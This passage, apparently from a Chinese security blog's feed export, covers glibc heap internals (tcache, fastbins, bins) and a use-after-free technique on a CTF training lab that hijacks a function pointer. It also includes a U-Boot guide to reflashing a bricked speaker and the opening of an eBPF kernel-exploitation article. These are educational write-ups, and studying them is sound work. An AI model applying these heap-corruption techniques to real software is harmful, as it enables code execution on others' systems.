<p>第一次delte 第一个node，tcache的结果<br><img src="/images/heap_exp/2021-05-19-14-46-03.png" alt><br>这个感觉不太对，所以感觉在32位的时候貌似GEF的heap指令显示的结果都有点问题，自己尝试确定tcache真实的状态。<br>根据我的理解，tcache与fastbin类似，都是一个数组指针在维护，那么tcache的数组中必有一个指针是指向刚刚释放的note的，他的有效载荷的地址是0x0804b1a0，我们先通过search-pattern去搜索一下这个地址，看看能不能在libc的空间中找到记载这个地址的内存，如果有那么大概率就是tcache数组的地址，<br><img src="/images/heap_exp/2021-05-19-14-53-13.png" alt><br>后来并没有发现在libc的内存空间中有这个,只是在hacknote和heap中有这个，通过源码我们知道，必定有一个静态变量存储着tcache<br>再次对比源码我发现起始fastbin数组和tcache数组还是有着很大的区别的<br>fastbin数组的元素是chunk header的指针，也就是说这个数组中确实保存着指向堆区地址的指针，而<code>tcache_entry *entries[TCACHE_MAX_BINS];</code>这个数组的元素是指向tcache_entry的，而这个东西并不是malloc_chunk数据结构，它是在什么地方生成的，还不确定。<br>经过分析源码发现<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">static __always_inline void</span><br><span class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="line">     detect a double free.  */</span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>实际上就是将tcache_entry 实际上就是指向的chunk中有效负载的地址的。<br>向tcache中添加一个chunk的流程，当释放一个chunk的时候，首先得到他的有效负载的地址，将他赋值给一个tcache_entry指针e<br>e-&gt;key = tcache实际上就是chunk中的bk指针指向了tcache</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct tcache_entry</span><br><span class="line">&#123;</span><br><span class="line">  struct tcache_entry *next;</span><br><span class="line">  /* This field exists to detect double frees.  */</span><br><span class="line">  struct tcache_perthread_struct *key;</span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
<p>而<code>e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</code>的意义是让chunk的fd指针指向了某个地址，至于这个地址是什么我觉着应该是之前已经在这个tcache链表上的一个chunk的地址。这个需要我们分析<code>PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</code>到底干了什么，因为要插入到tcache，所以肯定有tcache中将数组中的元素指向了这个e，而这个e的值就是chunk中有效负载的地址，所以我们之前分析的不错，应该在libc中有一个地址指向0x0804b1a0。但是实际上并没有，所以还是有个地方出错了。</p>
<p>后来经过分析发现，tcache这个只不过是一个指针，它指向的内容并不一定是在全局变量区的，而有可能是堆上分配的，经过跟踪源码发现tcache的生成过程是<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcache = (tcache_perthread_struct *) victim;</span><br><span class="line"></span><br><span class="line">victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">_int_malloc&#123; p = sysmalloc (nb, av); return p;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/heap_exp/2021-05-24-12-22-24.png" alt><br>所以可以判断出来与fastbin数组不同的是，tcache是在堆上存储的数据结构，而各种bin则是在libc库的数据区存储的数据结构。所以我们通过search-pattern搜索到的就是tcache的位置，<code>0x804b090</code>这个应该就是0x10 chunk 所对应的元素地址。</p>
<p>还有一个不同就是tcache数组中存储的是指向有效负载地址的指针，而不是chunk的头部，而本来是fd，现在叫next的位置也是直接指向下一个有效负载的位置</p>
<p>如果我们理解正确的话，那么与<code>0x804b090</code>紧邻的地方存储的应该就是指向0x18chunk的有效负载的地址，就是我们content的地址 <code>0x0804b1b0</code>,验证试试。<br><img src="/images/heap_exp/2021-05-19-15-35-50.png" alt><br>我们发现果然是正确的，所以tcache的大致工作原理我用下面的这张图总结<br><img src="/images/heap_exp/2021-05-19-15-41-25.png" alt><br>注意tcache数组中的元素总是指向最新添加到tcache中的chunk的。当我们再次delete note的时候，可以继续观察0x804b090的指向，如果我们理解正确的话，这个地方应该是指向第二个note的地址0x0804b1d0， 0x804b094中存储的应该是第二个content地址0x0804b1e0。<br><img src="/images/heap_exp/2021-05-19-15-45-18.png" alt><br>而0x0804b1d0这个地址应该存储的是第一个note的地址，这样才能连接起来<br><img src="/images/heap_exp/2021-05-19-15-47-18.png" alt></p>
<p>当理解了整个heap的变化过程，我们很快就可以理解这个UAF exp的原理。</p>
<ol>
<li>首先创建两个note然后在删除两个note得到四个在tcache上的chunk,其中有两个chunk在0x10，另外连个在0x18</li>
<li>再创一个note，并且让content大小为8，这样就把两个chunk 0x10大小的给重新利用上了，这个新创建的note的content实际上就是第一个note</li>
<li>通过给这个content赋值，就可以修改第一个note的<code>void (*printnote)();</code>函数指针</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://www.jianshu.com/p/f894c2961ca6" target="_blank" rel="noopener">https://www.jianshu.com/p/f894c2961ca6</a></li>
<li><a href="https://github.com/scwuaptx/HITCON-Training/blob/master/LAB/lab10/hacknote.c" target="_blank" rel="noopener">https://github.com/scwuaptx/HITCON-Training/blob/master/LAB/lab10/hacknote.c</a></li>
<li><a href="http://p4nda.top/2018/03/20/tcache/" target="_blank" rel="noopener">http://p4nda.top/2018/03/20/tcache/</a></li>
<li><a href="https://guyinatuxedo.github.io/27-edit_free_chunk/heap_consolidation_explanation/index.html" target="_blank" rel="noopener">https://guyinatuxedo.github.io/27-edit_free_chunk/heap_consolidation_explanation/index.html</a></li>
</ol>
]]></content>
      <categories>
        <category>堆利用</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title>堆利用系列一：开篇</title>
    <url>/2021/05/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8B%E5%BC%80%E7%AF%87/</url>
    <content><![CDATA[<h2 id="堆利用系列之开篇"><a href="#堆利用系列之开篇" class="headerlink" title="堆利用系列之开篇"></a>堆利用系列之开篇</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>堆利用这块内容相对独立但是类型较多，希望本系列文章能够让读者掌握堆利用的一些通用方法，建立堆利用的基本知识体系。<br>堆是一块需要动态管理的内存，glibc是实现堆管理的库，为了效率更高的管理堆，引入了很多机制，这就给利用堆破坏漏洞实现代码执行提供了很多攻击面。<br>但是，相比于栈破坏的利用，堆本身就很复杂，需要理解堆的一些关键部分的工作原理，才能更好的写出利用代码，因此我们这篇文章先学习了解下堆的基本概念和关键实现原理。</p>
<h2 id="关于libc的版本"><a href="#关于libc的版本" class="headerlink" title="关于libc的版本"></a>关于libc的版本</h2><ol>
<li>malloc和calloc相关的代码都在libc中，但是不同libc版本，malloc的差异性可能会很大，导致需要利用不同的利用方式来针对同一种类型的漏洞。因此，在利用之前一定要搞清楚libc的版本，是uclibc还是glibc，以及具体的子版本号。</li>
</ol>
<h2 id="Malloc-Chunk"><a href="#Malloc-Chunk" class="headerlink" title="Malloc Chunk"></a>Malloc Chunk</h2><ol>
<li>首先我们要学习一下Chunk的基本概念</li>
<li>当我们在调用malloc的时候，就会返回一个指针指向一个chunk</li>
<li><p>我们的测试代码</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void main(void)</span><br><span class="line">&#123;</span><br><span class="line">    char *ptr;</span><br><span class="line"></span><br><span class="line">    ptr = malloc(0x10);</span><br><span class="line"></span><br><span class="line">    strcpy(ptr, &quot;panda&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>我们可以看到在panda的前面是有一块描述区的，这一块也是chunk的一部分，我们可以把它叫做metadata部分，他主要是由一块标识前一个chunk大小的和一个表示当前chunk大小的部分组成。在64位中，一个标识的长度是8个字节，在32位中则是4个字节。<br><img src="/images/heap_exp/2021-05-17-15-44-41.png" alt></p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0:    0x00     - Previous Chunk Size</span><br><span class="line">0x8:    0x21     - Chunk Size</span><br><span class="line">0x10:     &quot;pada&quot;     - Content of chunk</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>我们可能会发现，在本例中标识前一个块的大小的是0x0，这是什么意思，这个主要是根据chunk size这个字段的标识0x21，说明前面一个紧邻的chunk是被使用了，因此previouschunksize这个字段实际上是上一个chunk的数据区部分。换句话说，根据chunk size字段的最后一位的不同，chunk的结构的意义是不一样的，但是大小是不变的。<br> <img src="/images/heap_exp/2021-05-17-16-00-30.png" alt></li>
<li>Chunk size字段的最后一位是标志着前面一块是否在使用的，1代表着在使用，0代表着没有使用</li>
<li>对于被释放的Chunk，他还有两个字段是用来指向在bin链表中相邻的chunk的，注意bin链表中相邻与实际上的相邻chunk是不一样的。有的bin链表是双向链表，需要使用fd和bk两个字段，有的链表是单向链表，只需要使用fd字段，bk无意义。</li>
</ol>
<h2 id="Bins"><a href="#Bins" class="headerlink" title="Bins"></a>Bins</h2><ol>
<li>heap中有各种各样的Bin数据结构，当一个chunk被释放了，会被bin数据结构记录，一般是一个链表。根据被释放的chunk的大小，将他们放到不同的bin中，主要有下面几种bin<ul>
<li>Fast bin：</li>
<li>Unsorted bin</li>
<li>Small bin</li>
<li>Large bin</li>
</ul>
</li>
<li>这个数据结构可以加快下一次分配chunk的时候更加迅速，直接在这些bin中先寻找合适的chunk</li>
</ol>
<h3 id="Fast-bin"><a href="#Fast-bin" class="headerlink" title="Fast bin"></a>Fast bin</h3><ol>
<li><p>在x64中，Fastbin chunk的大小是从0x20，到0x80。Fastbin共有7个链表组成，每个链表上维护的chunk的大小都是相同的，通过GEF的 heap bins fast可以方便的查看各个fast bin链表上的情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">────────────────────── Fastbins for arena 0x7ffff7dd1b20 ──────────────────────</span><br><span class="line">Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE)</span><br><span class="line">Fastbins[idx=1, size=0x20]  ←  Chunk(addr=0x602050, size=0x30, flags=PREV_INUSE)</span><br><span class="line">Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602080, size=0x40, flags=PREV_INUSE)</span><br><span class="line">Fastbins[idx=3, size=0x40]  ←  Chunk(addr=0x6020c0, size=0x50, flags=PREV_INUSE)</span><br><span class="line">Fastbins[idx=4, size=0x50]  ←  Chunk(addr=0x602110, size=0x60, flags=PREV_INUSE)</span><br><span class="line">Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0x602170, size=0x70, flags=PREV_INUSE)</span><br><span class="line">Fastbins[idx=6, size=0x70]  ←  Chunk(addr=0x6021e0, size=0x80, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure>
</li>
<li><p>注意要分清楚Fast chunk和fast bin是不同的概念，fast chunk的意思是放在fast bin链表上的chunk。fastbin本身实际上是一个数组，数组的每个元素是一个fast bin链表指针，fast bin链表指针指向heap中的chunk的地址，而chunk中有fd指针，又指向了下一个free chunk，因此这样就形成了一个单向链表。当插入chunk的时候是从头部开始插入的，就是先入后出的。<br><img src="/images/heap_exp/2021-05-17-16-30-58.png" alt></p>
</li>
</ol>
<h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><ol>
<li>这个数据结构是在2.26版本中新引入的，每一个线程都会有一个tcache,目的是不需要再多线程中操作heap的时候给bin加锁，这样就可以更加的迅速。tcache是在分配chunk的时候的第一优先考虑的分配来源，甚至比fast bin还要优先。</li>
<li><p>tcache的数据结构与Fast bin类似，都是一个单向链表，都是先入后出的。相关的数据结构源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct tcache_entry</span><br><span class="line">&#123;</span><br><span class="line">struct tcache_entry *next;</span><br><span class="line">/* This field exists to detect double frees.  */</span><br><span class="line">struct tcache_perthread_struct *key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">typedef struct tcache_perthread_struct</span><br><span class="line">&#123;</span><br><span class="line">uint16_t counts[TCACHE_MAX_BINS];</span><br><span class="line">tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line">static __thread bool tcache_shutting_down = false;</span><br><span class="line">static __thread tcache_perthread_struct *tcache = NULL;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>static __thread tcache_perthread_struct *tcache</code>这个是个全局变量，直接指向了这个tcache数据结构，应该是每个线程都会维护以这个这个全局变量。 tcache_perthread_struct中包含了一个tcache_entry数组，元素有64个，代表着64个链表，也就是说以供会有64个单向链表组成一个tcache，每个链表上也是与fast bin一样都是记录的相同大小的某个size的chunk。但是与fastbin不一样的是，单向链表的长度是有限制的，不能超过7，当超过7个的时候就会往对应的bin上进行分流，同样可以通过GEF的heap bins tcache去查看。64个链表维护的chunk大小范围为0x20-0x410,间隔是0x10.</li>
</ul>
</li>
</ol>
<h3 id="Unsorted，-Large-和-Small-bins"><a href="#Unsorted，-Large-和-Small-bins" class="headerlink" title="Unsorted， Large 和 Small bins"></a>Unsorted， Large 和 Small bins</h3><ol>
<li><p>Unosrted, Large 和 Small bins联系的比较紧密，他们都是在一个数组中的，而fastbin 和tcache都是有自己单独的数组的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> /* Normal bins packed as described above */</span><br><span class="line">mchunkptr bins[NBINS * 2 - 2];</span><br></pre></td></tr></table></figure>
<p> bins这个数组中的第0个元素空置，第一个元素就是指向unsorted bin list的指针，紧接着的62个元素都是指向samll bin 链表的指针，后面63个指向的是Large bin链表的指针。<br> 如下图所示的结构图<br> <img src="/images/heap_exp/2021-05-18-10-25-09.png" alt></p>
</li>
<li><p>Unsorted bin链表，这个主要是用来存放刚被释放的chunk，被free释放掉的chunk并不会直接回到对应small bin或者large bin中，而是先回到unsorted bin，以供后面malloc的时候更加快速的使用。</p>
<ul>
<li>这是一个双向链表，与fast bin链表不同是它多了一个bk指针</li>
<li>这个链表上的大小并不是固定的，任何大小的chunk都可以到这个链表上来</li>
<li>当出现malloc_consolidate，就是一次对heap的整理，就会把unsorted bin重新放到各自对应chunk size的链表上</li>
</ul>
</li>
<li><p>Small bin的每个链表存放的元素的大小的都是相同的，对于大小不大于0x400(64bit)的chunk会被放置在这个链表上</p>
</li>
<li>Large Bin使用来存放超过0x400大小的chunk的，但是这些链表上的chunk的大小并不一定是相同的，而是有一个范围的，比如对于0x400到0x420(仅举例)的chunk都放在第一个large bin的链表上。</li>
</ol>
<h3 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h3><ol>
<li>是在当前在用的堆区的最顶部，它不是属于任何一个bin，是一个之前调用mmap或者sbrk从内核中分配的内存还剩下未用的区域。如果用户请求的size在所有的bin和tcache中都没有满足，就会从top chunk开始分配，剩下的未用的chunk则是新的top chunk。</li>
<li>如果当前用户请求的size连top chunk都满足不了，则会继续调用系统调用mmap或者sbrk扩展堆区，就是扩展top chunk。然后再把chunk返回给用户。</li>
<li>top chunk是所有分配的源头，第一个malloc肯定是从top chunk中分配的，因为此时所有的bin和tcache都是空的</li>
</ol>
<h3 id="各种bin和chunk在内存中的示意图"><a href="#各种bin和chunk在内存中的示意图" class="headerlink" title="各种bin和chunk在内存中的示意图"></a>各种bin和chunk在内存中的示意图</h3><p><img src="/images/heap_exp/2021-05-18-11-32-00.png" alt></p>
<ol>
<li>malloc_chunk就是chunk header，是一个chunk的开头，无论malloced或者空闲的都有这个header.</li>
</ol>
<h3 id="Main-Arena"><a href="#Main-Arena" class="headerlink" title="Main Arena"></a>Main Arena</h3><ol>
<li>Main Arena实际上就是一个对heap的抽象的数据结构，它包含了对各种bin的定义，tcache的定义，top chunk的定义，都是在这个数据结构中的，它在初始化的时候是作为一个全局变量保留在全局区域的。</li>
<li>当我们在GEF中调用heap相关的各种命令实际上都是通过对这个变量的读取来解析的。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  heap bins</span><br><span class="line"> [+] No Tcache in this version of libc</span><br><span class="line"> ────────────────────── Fastbins for arena 0x7ffff7dd1b20 ──────────────────────</span><br><span class="line"> Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)</span><br><span class="line"> Fastbins[idx=1, size=0x20] 0x00</span><br><span class="line"> Fastbins[idx=2, size=0x30] 0x00</span><br><span class="line"> Fastbins[idx=3, size=0x40] 0x00</span><br><span class="line"> Fastbins[idx=4, size=0x50] 0x00</span><br><span class="line"> Fastbins[idx=5, size=0x60] 0x00</span><br><span class="line"> Fastbins[idx=6, size=0x70] 0x00</span><br><span class="line"> ───────────────────── Unsorted Bin for arena &apos;main_arena&apos; ─────────────────────</span><br><span class="line"> [+] Found 0 chunks in unsorted bin.</span><br><span class="line"> ────────────────────── Small Bins for arena &apos;main_arena&apos; ──────────────────────</span><br><span class="line"> [+] Found 0 chunks in 0 small non-empty bins.</span><br><span class="line"> ────────────────────── Large Bins for arena &apos;main_arena&apos; ──────────────────────</span><br><span class="line"> [+] Found 0 chunks in 0 large non-empty bins.</span><br><span class="line"> gef➤  x/20g 0x7ffff7dd1b20</span><br><span class="line"> 0x7ffff7dd1b20 &lt;main_arena&gt;:  0x0 0x602000</span><br><span class="line"> 0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0 0x0</span><br><span class="line"> 0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0 0x0</span><br><span class="line"> 0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0 0x0</span><br><span class="line"> 0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0 0x0</span><br><span class="line"> 0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0 0x602120</span><br><span class="line"> 0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0 0x7ffff7dd1b78</span><br><span class="line"> 0x7ffff7dd1b90 &lt;main_arena+112&gt;:  0x7ffff7dd1b78  0x7ffff7dd1b88</span><br><span class="line"> 0x7ffff7dd1ba0 &lt;main_arena+128&gt;:  0x7ffff7dd1b88  0x7ffff7dd1b98</span><br><span class="line"> 0x7ffff7dd1bb0 &lt;main_arena+144&gt;:  0x7ffff7dd1b98  0x7ffff7dd1ba8</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Consolidation"><a href="#Consolidation" class="headerlink" title="Consolidation"></a>Consolidation</h3><ol>
<li>由于多次的释放和malloc会不可避免的出现很多小的chunk，这就有可能有两个连续的chunk虽然都是空闲的，但是由于是两个独立的chunk，在malloc使用的时候并不能将他们作为一个chunk返回，因此就会降低内存的使用效率，为了减少碎片，就需要在合适的时候将这些相邻的空闲块给合并成一个大的chunk。</li>
<li>合并的函数就是malloc_consolidate, 调用它的时候就会对空闲块进行合并，那么这个函数的调用条件有什么呢<ol>
<li>malloc large bin的时候，当需要很大的chunk的时候，就会调用这个函数先进行一次合并，看看会不会多出来一些可以用的chunk。</li>
<li>当top chunk中的空间不够用的时候</li>
<li>free函数之后，会对chunk进行前后合并，如果这个合并后的chunk size大于FASTBIN_CONSOLIDATION_THRESHOLD，也会调用一次</li>
</ol>
</li>
</ol>
<h3 id="与堆利用相关的"><a href="#与堆利用相关的" class="headerlink" title="与堆利用相关的"></a>与堆利用相关的</h3><ol>
<li>我们前面先简单介绍了一下与堆相关的一些基本概念，虽然没有覆盖完全，但是与堆利用相关的已经基本列出，更加详细的认知需要在漏洞利用的过程中再去学习。</li>
<li>下面列出对漏洞利用的知识体系的基本框架<br><img src="/images/heap_exp/2021-05-18-11-49-04.png" alt></li>
<li>我们要想进行堆利用，就需要首先发现一个与堆相关的漏洞，UAF，堆溢出，double free这些，然后我们通过这个漏洞去修改一些chunk，这些chunk肯定是属于某个bin 链表或者tcache中，然后我们再借用house的各种方法去实现更复杂的利用方法。虽然还有很多方法没有列出，但是我们可以先掌握这些最基本的，这也是我在这个系列文章中要覆盖到的一些方法。</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a></li>
<li><a href="https://guyinatuxedo.github.io/25-heap/index.html?search=" target="_blank" rel="noopener">https://guyinatuxedo.github.io/25-heap/index.html?search=</a></li>
<li><a href="http://jcs.iie.ac.cn/ch/reader/create_pdf.aspx?file_no=20180101&amp;flag=1&amp;year_id=2018&amp;quarter_id=1" target="_blank" rel="noopener">http://jcs.iie.ac.cn/ch/reader/create_pdf.aspx?file_no=20180101&amp;flag=1&amp;year_id=2018&amp;quarter_id=1</a></li>
</ol>
<h2 id="版权声明"><a href="#版权声明" class="headerlink" title="版权声明"></a>版权声明</h2><p>本文作者为colorlight，首发于安全客 <a href="https://www.anquanke.com/post/id/241239" target="_blank" rel="noopener">https://www.anquanke.com/post/id/241239</a></p>
]]></content>
      <categories>
        <category>堆利用</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title>抢救变砖的小爱音箱</title>
    <url>/2021/01/26/%E6%8A%A2%E6%95%91%E5%8F%98%E7%A0%96%E7%9A%84%E5%B0%8F%E7%88%B1%E9%9F%B3%E7%AE%B1/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近小伙伴把某块音箱给变砖了，因为一番骚操作把mtd分区直接dd了，导致无法启动，土豪的他选择又买了一个。我缺音箱，我想试试修复一下，修好了还能用，于是就开始了自己的一番折腾。本篇文章仅作为修复音箱的教程，特此声明。</p>
<h2 id="情况分析"><a href="#情况分析" class="headerlink" title="情况分析"></a>情况分析</h2><p>现在文件系统已经被破坏了，但是内核和uboot都还完好，因此我们可以尝试看看能否进入uboot中的shell，然后做些事情。那么问题就来了，我们要怎么进入uboot的shell呢，一般情况下，芯片都会有支持串口的引脚，串口简单方便调试，我们可以拆开音箱板子上找找串口。</p>
<h2 id="板子上找串口"><a href="#板子上找串口" class="headerlink" title="板子上找串口"></a>板子上找串口</h2><p>串口UART，异步收发，不需要时钟，最少仅需要3根线，GND, TX, RX。如果做得比较安全的话，一般在出厂的时候会把焊点或者引脚给抹去，但是据我所知，大部分的厂商貌似都不care这些，很大方的留了很多信息，这款音箱也是。很快在板子上找到了可爱的三个测试点在电路板的边缘<br><img src="https://p5.ssl.qhimg.com/t0197516ab62a3403de.png"><br>用万用表测一下可以很快确定一个点是GND，另外两个可以通过观察串口是否能够正常工作判断TX和RX。<br>在确定了串口引脚之后，还需要外接一个USB转串口的rs232芯片，就像这样的<br><img src="https://p3.ssl.qhimg.com/t01846bf62d0e9b73b9.png"><br>连接好之后，可以在终端下输入命令<code>ls /dev/tty*</code>观察已经有串口<code>ttyUSB1</code>设备被识别<br><img src="https://p0.ssl.qhimg.com/t01ce306b066fc94a97.png"><br>在linux下，可以通过串口工具minicom与串口进行通信。在使用minicom之前，需要配置串口名称和波特率，名称就是ttyUSB1，而波特率一般是115200.<br>通过执行<code>sudo minicom -s</code>进入配置串口名称和波特率的界面<br><img src="https://p1.ssl.qhimg.com/t01517602af65577189.png"><br>除此之外，还需要修改Hardware Flow Control改为No，使得minicom允许输入。这样才能进行交互</p>
<h2 id="uboot-shell"><a href="#uboot-shell" class="headerlink" title="uboot shell"></a>uboot shell</h2><p>很幸运，这款音箱的uboot shell没有被裁减，因此给了我们通过uboot修复分区的可能性。在重启的时候会有一段时间允许进入uboot shell中，这段时间一般都比较短，需要在重启的时候不断的按空格或者回车即可。界面如下图<br><img src="https://p3.ssl.qhimg.com/t01015a360e76f84897.png"><br>在这个界面下是支持很多命令的，通过help查看<br><img src="https://p4.ssl.qhimg.com/t01bcf20d949ac212bb.png"><br>通过uboot给定的命令，我们就可以利用uboot给的shell实现将固件烧录到nand flash中</p>
<h2 id="准备新固件"><a href="#准备新固件" class="headerlink" title="准备新固件"></a>准备新固件</h2><p>新的固件可以从新设备上提取，亦可以在网上下载，还可以通过抓包获取，获取的方法有很多。关键是我们要固件的格式进行分析，找到我们想要烧入到nand flash中的部分。我拿到的固件是通过OTA升级抓包拿到的，通过binwalk 可以看到包的基本结构如下<br><img src="https://p3.ssl.qhimg.com/t01e90705ff200df540.png"><br>我们所需要的正是文件系统，0x380开始到0x1F5DED0，将这块内容dd下来就是包含了完整的文件系统。<br>我们只需要将这部分的固件发送给音箱即可。</p>
<h2 id="nand-flash烧写方法"><a href="#nand-flash烧写方法" class="headerlink" title="nand flash烧写方法"></a>nand flash烧写方法</h2><h3 id="确认固件烧写位置"><a href="#确认固件烧写位置" class="headerlink" title="确认固件烧写位置"></a>确认固件烧写位置</h3><p>在往nand flash中烧入固件之前，我们需要先确定nand flash是如何分区的，在启动日志中可以看到下图<br><img src="https://p4.ssl.qhimg.com/t0123db5fd761dcd7a2.png"><br>可以看到有boot0 boot1 system0 system1分区，猜测有两套启动方式，一套是主要的，一套是升级或者出厂设置使用的，经过查看发现system1是空的，所以极有可能真正的文件系统是在system0分区的。<br>system0对应位置为<code>0x2000000-0x4080000</code><br>但是起始位置是相同的，起始位置<code>0x2000000</code>很关键，这个是我们的目标位置</p>
<h3 id="从串口接收文件系统部分的固件"><a href="#从串口接收文件系统部分的固件" class="headerlink" title="从串口接收文件系统部分的固件"></a>从串口接收文件系统部分的固件</h3><ul>
<li>选择一块空的内存区域，我之前选的是0x5000000,有问题，后来选择的0x6000000,这个位置是试出来的，目的是接收system0分区</li>
<li>使用kermit接收执行命令<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">loadb 0x6000000</span><br></pre></td></tr></table></figure>
进入如下界面<br><img src="https://p0.ssl.qhimg.com/t01ba21c78997a3194e.png"><br>按快捷键CTRL+A S 进入发送协议选择界面<br><img src="https://p4.ssl.qhimg.com/t018c4f2671779443fe.png"><br>选择kermit协议，并且选择要发送的文件，按空格键选中文件。<br>发送文件的界面<br><img src="https://p1.ssl.qhimg.com/t011a7802e5b19abf79.png"><br>此时可以完备的将固件发送到内存中，地址为0x6000000<br>由于此过程是通过串口发送，因此其速度比较慢，实测耗时1个小时</li>
</ul>
<h3 id="将内存中接收的system0写入nand-flash"><a href="#将内存中接收的system0写入nand-flash" class="headerlink" title="将内存中接收的system0写入nand flash"></a>将内存中接收的system0写入nand flash</h3><p>首先擦除system0分区，执行如下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nand erase.part system0</span><br></pre></td></tr></table></figure>
<p>然后往system0分区中执行烧写工作，执行如下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nand write 0x6000000 0x2000000 0x2000000</span><br></pre></td></tr></table></figure>
<p>写入过程很快，不用等待</p>
<h3 id="完成烧写"><a href="#完成烧写" class="headerlink" title="完成烧写"></a>完成烧写</h3><p>至此已经完成文件系统的修复。经过重启，发现音箱又复活了~~</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>本文介绍了在仅有串口的情况下如何利用uboot的shell完成对Nand flash的固件写入流程，虽然可能不同的设备细节上不尽相同，但是基本流程本文已经介绍的较为清晰，当然除了串口还有别的方式实现救砖的工作，比如USB启动或者JTAG等方式，这些方式速度较快，但是对硬件电路的逆向水平也更高，所以我最爱的还是串口。</p>
<h2 id="版权声明"><a href="#版权声明" class="headerlink" title="版权声明"></a>版权声明</h2><p>本文作者为colorlight，首发于安全客 <a href="https://www.anquanke.com/post/id/229320">https://www.anquanke.com/post/id/229320</a></p>
]]></content>
      <categories>
        <category>IoT</category>
      </categories>
  </entry>
  <entry>
    <title>Linux内核攻击面指eBPF模块</title>
    <url>/2020/10/22/Linux%E5%86%85%E6%A0%B8%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8C%87eBPF%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<p>##0x00 前言<br>eBPF是Linux内核中的一个模块，主要作用是实现包过滤功能。由于eBPF提供了一种从用户面到Linux内核的接口，用户编写的eBPF程序可以在内核提供的虚拟机中执行，因此eBPF也是一个重要的内核提权的攻击面。本文将详细叙述eBPF的基本原理和实现方法，对eBPF内核提权漏洞CVE-2020-8835的Root Cause进行详细的分析。通过本文，期望即使对eBPF模块不熟悉的同学也能够理解该漏洞的原理。本文会对必要的eBPF原理进行介绍但是不会沉溺eBPF细节，更主要的是想向大家介绍eBPF是一个理想的内核提权攻击面。</p>
<hr>
<h2 id="0x01-eBPF背景知识"><a href="#0x01-eBPF背景知识" class="headerlink" title="0x01 eBPF背景知识"></a>0x01 eBPF背景知识</h2><p>为了能够对eBPF安全有个总体的了解，我们既需要对eBPF本身的设计以及实现有所了解，同时最好佐以漏洞实例进行分析，从而对eBPF这个内核攻击面建立更加具象的理解。</p>
